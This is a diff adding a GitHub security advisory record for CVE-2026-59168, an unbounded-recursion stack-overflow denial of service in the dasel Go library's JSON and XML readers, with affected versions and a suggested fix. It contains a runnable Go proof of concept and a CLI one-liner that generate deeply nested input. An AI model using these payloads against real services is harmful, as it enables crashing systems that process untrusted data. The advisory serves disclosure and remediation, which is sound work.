@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-cqxr-jxr2-85pq",
+  "modified": "2026-09-22T20:00:05.181616600Z",
+  "published": "2026-09-22T19:51:07Z",
+  "aliases": [
+    "CVE-2026-59168"
+  ],
+  "summary": "Dasel: Unbounded recursion in JSON and XML readers causes unrecoverable stack-overflow DoS",
+  "details": "## Summary\n\n`dasel`'s JSON and XML readers parse nested structures with unbounded recursion, one\nnative stack frame per nesting level, with no depth guard. A small (sub-10 MB), deeply\nnested document drives the Go runtime past its goroutine stack limit and triggers a\n`fatal error: stack overflow`. This is **unrecoverable**: it is a runtime fatal error, not\na `panic`, so a consumer's `defer`/`recover` cannot intercept it, the entire process dies.\n\nBoth readers are affected; neither has a depth limit, and the JSON reader additionally has\nno input-size cap (the XML reader caps size at 10 MB but not depth).\n\n## Affected Versions\n\n`github.com/tomwright/dasel/v3` and all v3.x releases through **v3.11.0** (current `main`,\ncommit `abc1e1d`). This vulnerability is fixed in 3.11.1. Pre-v3 is out of scope.\n\n## Description\n\n### JSON reader @ `parsing/json/json_reader.go`\n\n`decodeValue` (line 54) dispatches to the mutually-recursive `decodeObject` (line 78) and\n`decodeArray` (line 140). Each calls back into both for nested values\n(`decodeArray`→`decodeArray` at line 151, `decodeObject` at 163; `decodeObject`→`decodeArray`\nat 95, `decodeObject` at 111). Every `[` or `{` in the input adds one stack frame. There is\n**no depth counter and no `len(data)` cap** anywhere in the reader.\n\n### XML reader @`parsing/xml/reader.go`\n\n`parseElement` (line 172) recurses at line 211 for every `xml.StartElement`. The file\ndeclares explicit DoS guards — `maxXMLSize = 10_000_000`, comment count/length — but these\nbound **size and comment volume, not nesting depth**. The open tag `\u003ca\u003e` is 3 bytes, so the\n10 MB cap still permits ~3.3 M nesting levels, exhausting the stack long before the size\nlimit fires.\n\n### Reachability (both)\n\nBoth are on the primary public read path: `parsing.Format(\u003cfmt\u003e).NewReader(opts).Read(data)`,\nwith `data` fully attacker-controlled and no depth validation before the recursion. The same\npath backs the `dasel` CLI (`dasel -r json` / `-r xml`). Default reader, no special options.\nGo stack overflow is a `fatal error`, so `recover()` at the call site does not help.\n\n### Precedent in this codebase\n\nDoS hardening on the readers is already an accepted concern here, which is why this is a gap\nrather than a design choice: the XML reader has the `maxXMLSize` cap, and the **YAML reader\nalready implements exactly the fix needed**, `parsing/yaml/yaml_reader.go:31,90-93` returns\n`ErrYamlExpansionDepthExceeded` once `expansionDepth \u003e maxExpansionDepth`. The JSON and XML\nreaders simply lack the equivalent depth guard.\n\n## Proof of Concept\n\nSingle runnable program, public API only (`poc/main.go`, module wired to a local clone via\n`replace`):\n\n```go\npackage main\n\nimport (\n\t\"fmt\"; \"os\"; \"strings\"\n\t\"github.com/tomwright/dasel/v3/parsing\"\n\t_ \"github.com/tomwright/dasel/v3/parsing/json\"\n\t_ \"github.com/tomwright/dasel/v3/parsing/xml\"\n)\n\nfunc main() {\n\tmode := \"json\"; if len(os.Args) \u003e 1 { mode = os.Args[1] }\n\tdepth := 6_000_000; if mode == \"xml\" { depth = 3_200_000 }\n\n\tvar data []byte\n\tif mode == \"xml\" {\n\t\tdata = []byte(strings.Repeat(\"\u003ca\u003e\", depth))          // ~9.6MB, under the 10MB cap\n\t} else {\n\t\tdata = []byte(strings.Repeat(\"[\", depth) + strings.Repeat(\"]\", depth)) // ~12MB\n\t}\n\n\tdefer func() { if r := recover(); r != nil { fmt.Println(\"recovered (NOT fatal):\", r) } }()\n\tr, _ := parsing.Format(mode).NewReader(parsing.DefaultReaderOptions())\n\tv, err := r.Read(data)\n\tfmt.Printf(\"Read returned WITHOUT crash: v=%v err=%v\\n\", v != nil, err)\n}\n```\n\n```\ngo run . json    # nested arrays -\u003e fatal error: stack overflow ; ~85 decodeArray frames\ngo run . xml     # nested \u003ca\u003e    -\u003e fatal error: stack overflow ; ~93 parseElement frames\n```\n\nObserved (Go 1.26, default 1 GB goroutine stack):\n- `json` depth 6 M (12 MB): `runtime: goroutine stack exceeds 1000000000-byte limit` →\n  `fatal error: stack overflow`; backtrace dominated by `json.(*jsonReader).decodeArray`.\n  `depth 2 M` completes (~0.83 s), confirming it is depth-driven, not a parse error.\n- `xml` depth 3.2 M (9.6 MB, **under** the 10 MB `maxXMLSize` cap): same fatal overflow;\n  backtrace is an unbroken chain of `xml.(*xmlReader).parseElement` at `reader.go:211`.\n- The deferred `recover()` never fires in either case — the process exits.\n- CLI equivalents: `printf '\u003ca\u003e%.0s' {1..3200000} | dasel -r xml`.\n\n## Impact\n\nAn attacker who controls JSON or XML passed to dasel — via the library `Read` API, the CLI,\nor the `parse('json'|'xml', …)` selector function — crashes the host process with a single\nsmall document. Because the failure is a Go `fatal error` rather than a recoverable panic, a\nconsumer that wraps parsing in `defer`/`recover` is **still** taken down: the whole process\nterminates, killing every in-flight goroutine, not just the parse. Availability only — no\nconfidentiality or integrity impact. For a library consumer feeding network-sourced data to\n`Read`, this is a remotely triggerable, unrecoverable DoS.\n\n## Suggested Fix\n\nAdd a recursion-depth guard to both readers, mirroring the YAML reader's existing\n`maxExpansionDepth` / `ErrYamlExpansionDepthExceeded` pattern:\n\n- **JSON** — thread a `depth int` through `decodeValue`/`decodeObject`/`decodeArray`,\n  increment on descent, return `ErrJSONMaxDepthExceeded` past a conservative bound\n  (e.g. 10 000). Optionally add a `maxJSONSize` cap matching `maxXMLSize` for parity.\n- **XML** — add a `maxXMLDepth` constant to the existing `Security limits` block and thread\n  a `depth` through `parseElement`, returning a normal error past the bound.\n\nBoth return a clean `error` for pathological input instead of crashing the process,\nconsistent with how the comment-count, size, and YAML-expansion limits already behave. A\nlimit in the low thousands preserves all realistic legitimate documents.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/tomwright/dasel/v3",
+        "purl": "pkg:golang/github.com/tomwright/dasel/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.11.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.11.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-cqxr-jxr2-85pq/GHSA-cqxr-jxr2-85pq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/TomWright/dasel/security/advisories/GHSA-cqxr-jxr2-85pq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59168"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/TomWright/dasel/commit/4c91d0d02dc59ce8404709b1bfed7a6fabe62f68"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/TomWright/dasel"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/TomWright/dasel/releases/tag/v3.11.1"
+    }
+  ]
+}
